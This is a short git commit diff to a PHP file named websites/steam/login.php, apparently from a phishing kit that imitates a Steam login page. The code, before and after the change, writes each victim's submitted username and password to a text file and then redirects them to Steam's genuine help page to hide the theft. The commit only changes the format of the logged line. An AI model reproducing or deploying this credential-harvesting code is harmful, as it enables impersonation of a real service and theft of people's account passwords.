1add791bdcbeb315d89126696751d9c8f87c2d9a
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 21:17:28 +0600

    Update login.php

--- websites/steam/login.php
+++ websites/steam/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Steam :- username : " . $_POST['username'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
 exit();
